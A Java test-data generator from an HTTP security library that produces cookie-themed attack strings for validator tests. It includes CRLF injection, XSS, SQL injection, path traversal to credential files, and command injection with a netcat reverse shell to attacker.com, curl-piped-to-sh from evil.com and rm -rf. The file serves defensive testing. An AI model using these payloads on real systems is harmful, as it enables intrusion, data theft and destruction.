/*
 * Copyright © 2025 CUI-OpenSource-Software (info@cuioss.de)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package de.cuioss.tools.security.http.generators;

import de.cuioss.test.generator.TypedGenerator;

import java.util.Arrays;
import java.util.List;

/**
 * Generator for cookie injection attack patterns.
 * 
 * <p>
 * This generator creates comprehensive cookie injection attack vectors that attempt
 * to manipulate HTTP cookie headers to bypass security controls, inject malicious
 * content, or perform session manipulation attacks. The generator covers various
 * cookie injection techniques used by attackers to exploit web applications.
 * </p>
 * 
 * <h3>Attack Types Generated</h3>
 * <ul>
 *   <li><strong>CRLF Injection in Cookies</strong> - Injects CRLF sequences into cookie values</li>
 *   <li><strong>Cookie Header Injection</strong> - Attempts to inject additional cookie headers</li>
 *   <li><strong>Session Fixation</strong> - Attempts to fix session identifiers</li>
 *   <li><strong>Session Hijacking</strong> - Patterns that could lead to session theft</li>
 *   <li><strong>Authentication Bypass</strong> - Cookie manipulation for privilege escalation</li>
 *   <li><strong>Cross-Site Cookie Injection</strong> - Domain manipulation attacks</li>
 *   <li><strong>Path Traversal via Cookies</strong> - Path manipulation in cookie parameters</li>
 *   <li><strong>XSS via Cookie Values</strong> - Script injection through cookies</li>
 *   <li><strong>SQL Injection via Cookies</strong> - Database injection through cookie parameters</li>
 *   <li><strong>Command Injection via Cookies</strong> - System command injection attempts</li>
 *   <li><strong>Cookie Overflow Attacks</strong> - Large cookie values to cause buffer overflows</li>
 *   <li><strong>Cookie Attribute Manipulation</strong> - Secure/HttpOnly/SameSite bypasses</li>
 *   <li><strong>Cookie Parsing Confusion</strong> - Malformed cookie structures</li>
 *   <li><strong>Unicode Cookie Attacks</strong> - Unicode manipulation in cookie values</li>
 *   <li><strong>Cookie Smuggling</strong> - Attempts to smuggle data via cookies</li>
 * </ul>
 * 
 * <h3>Security Standards</h3>
 * <ul>
 *   <li>RFC 6265 - HTTP State Management Mechanism (Cookies)</li>
 *   <li>OWASP - Session Management Cheat Sheet</li>
 *   <li>OWASP Top 10 - Broken Authentication and Session Management</li>
 *   <li>CWE-113 - Improper Neutralization of CRLF Sequences in HTTP Headers</li>
 *   <li>CWE-384 - Session Fixation</li>
 *   <li>CWE-472 - External Control of Assumed-Immutable Web Parameter</li>
 * </ul>
 * 
 * <h3>Usage Example</h3>
 * <pre>
 * &#64;ParameterizedTest
 * &#64;TypeGeneratorSource(value = CookieInjectionAttackGenerator.class, count = 100)
 * void shouldRejectCookieInjectionAttacks(String cookieAttack) {
 *     assertThrows(UrlSecurityException.class, 
 *         () -> pipeline.validate(cookieAttack));
 * }
 * </pre>
 * 
 * Implements: Task T17 from HTTP verification specification
 * 
 * @author Claude Code Generator
 * @since 2.5
 */
public class CookieInjectionAttackGenerator implements TypedGenerator<String> {

    private static final List<String> BASE_PATTERNS = Arrays.asList(
            "/login",
            "/authenticate",
            "/session",
            "/profile",
            "/admin",
            "/api/auth",
            "/secure",
            "/dashboard",
            "/account",
            "/user/settings"
    );

    private final AttackTypeSelector attackTypeSelector = new AttackTypeSelector(15);

    @Override
    public String next() {
        String basePattern = BASE_PATTERNS.get(hashBasedSelection(BASE_PATTERNS.size()));

        return switch (attackTypeSelector.nextAttackType()) {
            case 0 -> createCrlfCookieInjection(basePattern);
            case 1 -> createCookieHeaderInjection(basePattern);
            case 2 -> createSessionFixationAttack(basePattern);
            case 3 -> createSessionHijackingAttack(basePattern);
            case 4 -> createAuthenticationBypassCookie(basePattern);
            case 5 -> createCrossSiteCookieInjection(basePattern);
            case 6 -> createPathTraversalCookie(basePattern);
            case 7 -> createXssCookieInjection(basePattern);
            case 8 -> createSqlInjectionCookie(basePattern);
            case 9 -> createCommandInjectionCookie(basePattern);
            case 10 -> createCookieOverflowAttack(basePattern);
            case 11 -> createCookieAttributeManipulation(basePattern);
            case 12 -> createCookieParsingConfusion(basePattern);
            case 13 -> createUnicodeCookieAttack(basePattern);
            case 14 -> createCookieSmugglingAttack(basePattern);
            default -> createCrlfCookieInjection(basePattern);
        };
    }

    /**
     * Creates CRLF injection attacks through cookie parameters.
     */
    private String createCrlfCookieInjection(String pattern) {
        String[] crlfCookieAttacks = {
                pattern + "?cookie=value%0d%0aSet-Cookie: admin=true",
                pattern + "?session=abc123%0d%0aSet-Cookie: role=administrator",
                pattern + "?auth=token%0a%0aSet-Cookie: authenticated=yes",
                pattern + "?user=guest%0d%0aSet-Cookie: privilege=root%0d%0a",
                pattern + "?data=test%0d%0aSet-Cookie: session=hijacked; HttpOnly=false",
                pattern + "?param=val%0d%0aSet-Cookie: security=disabled%0d%0aLocation: /admin",
                pattern + "?id=123%0a%0aSet-Cookie: access_level=admin",
                pattern + "?token=xyz%0d%0aSet-Cookie: bypass=true%0d%0aContent-Type: text/html"
        };
        return crlfCookieAttacks[hashBasedSelection(crlfCookieAttacks.length)];
    }

    /**
     * Creates cookie header injection attacks.
     */
    private String createCookieHeaderInjection(String pattern) {
        String[] headerInjectionAttacks = {
                pattern + "?cookie=normal%0d%0aCookie: admin=true",
                pattern + "?session=user123%0d%0aCookie: role=administrator; secure",
                pattern + "?auth=basic%0a%0aCookie: privilege=root",
                pattern + "?data=payload%0d%0aCookie: authenticated=yes%0d%0aAuthorization: Bearer admin",
                pattern + "?user=test%0d%0aCookie: access_token=hijacked_token",
                pattern + "?login=attempt%0d%0aCookie: session_id=admin_session%0d%0aX-Admin: true",
                pattern + "?validate=user%0a%0aCookie: security_level=maximum",
                pattern + "?check=auth%0d%0aCookie: bypass_csrf=true%0d%0aContent-Length: 0"
        };
        return headerInjectionAttacks[hashBasedSelection(headerInjectionAttacks.length)];
    }

    /**
     * Creates session fixation attack patterns.
     */
    private String createSessionFixationAttack(String pattern) {
        String[] sessionFixationAttacks = {
                pattern + "?JSESSIONID=ATTACKER_SESSION_12345",
                pattern + "?sessionid=fixed_session_token_999",
                pattern + "?PHPSESSID=malicious_session_abc123",
                pattern + "?session_token=predetermined_token_xyz",
                pattern + "?auth_session=attacker_controlled_session",
                pattern + "?user_session=fixed_by_attacker_789",
                pattern + "?login_session=known_session_identifier",
                pattern + "?secure_session=predictable_session_456"
        };
        return sessionFixationAttacks[hashBasedSelection(sessionFixationAttacks.length)];
    }

    /**
     * Creates session hijacking attack patterns.
     */
    private String createSessionHijackingAttack(String pattern) {
        String[] hijackingAttacks = {
                pattern + "?cookie=victim_session%0d%0aSet-Cookie: session=attacker_session",
                pattern + "?session_id=stolen_from_victim_browser",
                pattern + "?auth=hijacked%0d%0aCookie: session_token=victim_token",
                pattern + "?user=victim%0d%0aSet-Cookie: authenticated=true; domain=evil.com",
                pattern + "?login=success%0d%0aSet-Cookie: session_id=cloned_session",
                pattern + "?token=captured%0a%0aSet-Cookie: user_session=stolen_session",
                pattern + "?validate=auth%0d%0aCookie: victim_session_id=captured_token",
                pattern + "?secure=false%0d%0aSet-Cookie: session=replayed_session%0d%0aPath: /"
        };
        return hijackingAttacks[hashBasedSelection(hijackingAttacks.length)];
    }

    /**
     * Creates authentication bypass cookie attacks.
     */
    private String createAuthenticationBypassCookie(String pattern) {
        String[] authBypassAttacks = {
                pattern + "?auth=false%0d%0aSet-Cookie: authenticated=true",
                pattern + "?user=guest%0d%0aCookie: role=admin",
                pattern + "?login=fail%0d%0aSet-Cookie: access_level=root%0d%0a",
                pattern + "?check=denied%0d%0aCookie: permission=granted; secure=false",
                pattern + "?validate=user%0a%0aSet-Cookie: admin=true",
                pattern + "?security=low%0d%0aCookie: privilege=maximum%0d%0aHttpOnly=false",
                pattern + "?access=restricted%0d%0aSet-Cookie: bypass=enabled",
                pattern + "?permission=denied%0d%0aCookie: override=true%0d%0aSameSite=None"
        };
        return authBypassAttacks[hashBasedSelection(authBypassAttacks.length)];
    }

    /**
     * Creates cross-site cookie injection attacks.
     */
    private String createCrossSiteCookieInjection(String pattern) {
        String[] crossSiteAttacks = {
                pattern + "?data=test%0d%0aSet-Cookie: session=hijacked; domain=evil.com",
                pattern + "?cookie=value%0d%0aSet-Cookie: auth=admin; domain=.attacker.com",
                pattern + "?user=victim%0a%0aSet-Cookie: token=stolen; domain=malicious.org",
                pattern + "?login=attempt%0d%0aSet-Cookie: role=admin; domain=bad-site.net%0d%0a",
                pattern + "?session=active%0d%0aCookie: privilege=root; domain=evil-domain.com",
                pattern + "?auth=token%0d%0aSet-Cookie: access=granted; domain=.hacker.org",
                pattern + "?validate=user%0a%0aSet-Cookie: admin=true; domain=attacker-site.com",
                pattern + "?secure=false%0d%0aSet-Cookie: bypass=enabled; domain=.malicious.net%0d%0aPath: /"
        };
        return crossSiteAttacks[hashBasedSelection(crossSiteAttacks.length)];
    }

    /**
     * Creates path traversal attacks via cookie parameters.
     */
    private String createPathTraversalCookie(String pattern) {
        String[] pathTraversalAttacks = {
                pattern + "?cookie=../../../etc/passwd",
                pattern + "?session=..%2f..%2f..%2fetc%2fshadow",
                pattern + "?auth=....//....//etc//hosts",
                pattern + "?user=..\\..\\..\\windows\\system32\\config\\sam",
                pattern + "?data=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                pattern + "?token=..%252f..%252f..%252fetc%252fpasswd",
                pattern + "?login=....%2f....%2f....%2fetc%2fshadow",
                pattern + "?config=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
        };
        return pathTraversalAttacks[hashBasedSelection(pathTraversalAttacks.length)];
    }

    /**
     * Creates XSS injection attacks via cookie values.
     */
    private String createXssCookieInjection(String pattern) {
        String[] xssAttacks = {
                pattern + "?cookie=%3cscript%3ealert(1)%3c/script%3e",
                pattern + "?session=javascript:alert('XSS')",
                pattern + "?auth=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e",
                pattern + "?user=%3cimg%20src=x%20onerror=alert(1)%3e",
                pattern + "?data=%3csvg%20onload=alert('cookie')%3e%3c/svg%3e",
                pattern + "?token=%27%3e%3cscript%3eeval(atob('YWxlcnQoMSk='))%3c/script%3e",
                pattern + "?login=%3ciframe%20src=javascript:alert(1)%3e%3c/iframe%3e",
                pattern + "?validate=%3cscript%20src=http://evil.com/xss.js%3e%3c/script%3e"
        };
        return xssAttacks[hashBasedSelection(xssAttacks.length)];
    }

    /**
     * Creates SQL injection attacks via cookie parameters.
     */
    private String createSqlInjectionCookie(String pattern) {
        String[] sqlInjectionAttacks = {
                pattern + "?cookie='; DROP TABLE users; --",
                pattern + "?session=admin' OR '1'='1",
                pattern + "?auth=1' UNION SELECT password FROM admin_users --",
                pattern + "?user='; INSERT INTO users VALUES ('hacker','password'); --",
                pattern + "?data=' OR 1=1; UPDATE users SET role='admin' WHERE id=1; --",
                pattern + "?token=1'; EXEC xp_cmdshell('whoami'); --",
                pattern + "?login=' UNION SELECT credit_card FROM payments --",
                pattern + "?validate='; CREATE USER hacker IDENTIFIED BY 'password'; --"
        };
        return sqlInjectionAttacks[hashBasedSelection(sqlInjectionAttacks.length)];
    }

    /**
     * Creates command injection attacks via cookie parameters.
     */
    private String createCommandInjectionCookie(String pattern) {
        String[] commandInjectionAttacks = {
                pattern + "?cookie=test; cat /etc/passwd",
                pattern + "?session=user`whoami`",
                pattern + "?auth=token$(id)",
                pattern + "?user=data|ls -la",
                pattern + "?login=value; rm -rf /*",
                pattern + "?data=param`nc -e /bin/sh attacker.com 4444`",
                pattern + "?token=test$(curl http://evil.com/malware.sh | sh)",
                pattern + "?validate=input; python -c 'import os; os.system(\"cat /etc/shadow\")'"
        };
        return commandInjectionAttacks[hashBasedSelection(commandInjectionAttacks.length)];
    }

    /**
     * Creates cookie overflow attack patterns.
     */
    private String createCookieOverflowAttack(String pattern) {
        String longValue = "A".repeat(8192);
        String veryLongValue = "B".repeat(16384);
        String extremeLongValue = "C".repeat(32768);

        String[] overflowAttacks = {
                pattern + "?cookie=" + longValue,
                pattern + "?session=" + veryLongValue,
                pattern + "?auth=" + extremeLongValue,
                pattern + "?user=" + longValue + "%0d%0aSet-Cookie: admin=true",
                pattern + "?data=" + veryLongValue + "%0a%0aCookie: role=admin",
                pattern + "?token=" + extremeLongValue.substring(0, 4000),
                pattern + "?login=" + longValue + "; role=admin",
                pattern + "?validate=" + veryLongValue.substring(0, 2000) + "%0d%0aX-Admin: true"
        };
        return overflowAttacks[hashBasedSelection(overflowAttacks.length)];
    }

    /**
     * Creates cookie attribute manipulation attacks.
     */
    private String createCookieAttributeManipulation(String pattern) {
        String[] attributeAttacks = {
                pattern + "?cookie=value%0d%0aSet-Cookie: session=admin; Secure=false",
                pattern + "?auth=token%0d%0aSet-Cookie: user=root; HttpOnly=false; Secure=false",
                pattern + "?data=test%0a%0aSet-Cookie: admin=true; SameSite=None",
                pattern + "?user=guest%0d%0aSet-Cookie: role=admin; Domain=evil.com; Secure=false",
                pattern + "?session=id%0d%0aCookie: privilege=max; HttpOnly=; Secure=",
                pattern + "?login=attempt%0d%0aSet-Cookie: access=granted; Path=/%0d%0aDomain: attacker.com",
                pattern + "?token=xyz%0a%0aSet-Cookie: bypass=true; Max-Age=999999999",
                pattern + "?validate=auth%0d%0aSet-Cookie: admin=yes; Expires=Wed, 09 Jun 2050 10:18:14 GMT"
        };
        return attributeAttacks[hashBasedSelection(attributeAttacks.length)];
    }

    /**
     * Creates cookie parsing confusion attacks.
     */
    private String createCookieParsingConfusion(String pattern) {
        String[] parsingConfusionAttacks = {
                pattern + "?cookie=val1; cookie=val2; admin=true",
                pattern + "?session=\"quoted_value\"; role=admin",
                pattern + "?auth=token;admin=true;user=guest",
                pattern + "?data=test; ;admin=true; ;",
                pattern + "?user=name=value; role=admin",
                pattern + "?login=; admin=true;session=hijacked;",
                pattern + "?token=abc;def;admin=true",
                pattern + "?validate=user;=;admin=true;="
        };
        return parsingConfusionAttacks[hashBasedSelection(parsingConfusionAttacks.length)];
    }

    /**
     * Creates Unicode-based cookie attacks.
     */
    private String createUnicodeCookieAttack(String pattern) {
        String[] unicodeAttacks = {
                pattern + "?cookie=\u0061\u0064\u006d\u0069\u006e", // "admin" in Unicode
                pattern + "?session=\u002e\u002e\u002f\u002e\u002e\u002f\u0065\u0074\u0063\u002f\u0070\u0061\u0073\u0073\u0077\u0064", // "../etc/passwd"
                pattern + "?auth=\u003c\u0073\u0063\u0072\u0069\u0070\u0074\u003e\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029\u003c\u002f\u0073\u0063\u0072\u0069\u0070\u0074\u003e", // "<script>alert(1)</script>"
                pattern + "?user=\u0000\u0061\u0064\u006d\u0069\u006e", // null byte + "admin"
                pattern + "?data=\u202e\u0061\u0064\u006d\u0069\u006e", // Right-to-left override + "admin"
                pattern + "?token=\u2028\u2029\u0061\u0064\u006d\u0069\u006e", // Line separators + "admin"
                pattern + "?login=\uFEFF\u0061\u0064\u006d\u0069\u006e", // BOM + "admin"
                pattern + "?validate=\u00A0\u0061\u0064\u006d\u0069\u006e" // Non-breaking space + "admin"
        };
        return unicodeAttacks[hashBasedSelection(unicodeAttacks.length)];
    }

    /**
     * Creates cookie smuggling attack patterns.
     */
    private String createCookieSmugglingAttack(String pattern) {
        String[] smugglingAttacks = {
                pattern + "?cookie=normal%0d%0a%0d%0aGET /admin HTTP/1.1%0d%0aCookie: admin=true",
                pattern + "?session=user%0a%0aGET /secure HTTP/1.1%0a%0aCookie: role=administrator",
                pattern + "?auth=token%0d%0a%0d%0aPOST /api/admin HTTP/1.1%0d%0aCookie: privilege=root",
                pattern + "?data=test%0a%0aDELETE /users HTTP/1.1%0aCookie: access=granted",
                pattern + "?user=guest%0d%0a%0d%0aGET /config HTTP/1.1%0d%0aCookie: bypass=true%0d%0a%0d%0a",
                pattern + "?login=attempt%0a%0aPUT /admin/settings HTTP/1.1%0aCookie: authenticated=yes",
                pattern + "?token=xyz%0d%0a%0d%0aGET /backdoor HTTP/1.1%0d%0aCookie: session=hijacked",
                pattern + "?validate=user%0a%0aPATCH /security HTTP/1.1%0aCookie: admin=true%0a%0a"
        };
        return smugglingAttacks[hashBasedSelection(smugglingAttacks.length)];
    }

    @Override
    public Class<String> getType() {
        return String.class;
    }

    /**
     * Creates hash-based selection for deterministic but varied attack patterns.
     */
    private int hashBasedSelection(int bound) {
        return Math.abs((int) (this.hashCode() + System.nanoTime())) % bound;
    }

    /**
     * Helper class to cycle through attack types systematically.
     */
    private static class AttackTypeSelector {
        private final int maxTypes;
        private int currentType = 0;

        AttackTypeSelector(int maxTypes) {
            this.maxTypes = maxTypes;
        }

        int nextAttackType() {
            int type = currentType;
            currentType = (currentType + 1) % maxTypes;
            return type;
        }
    }
}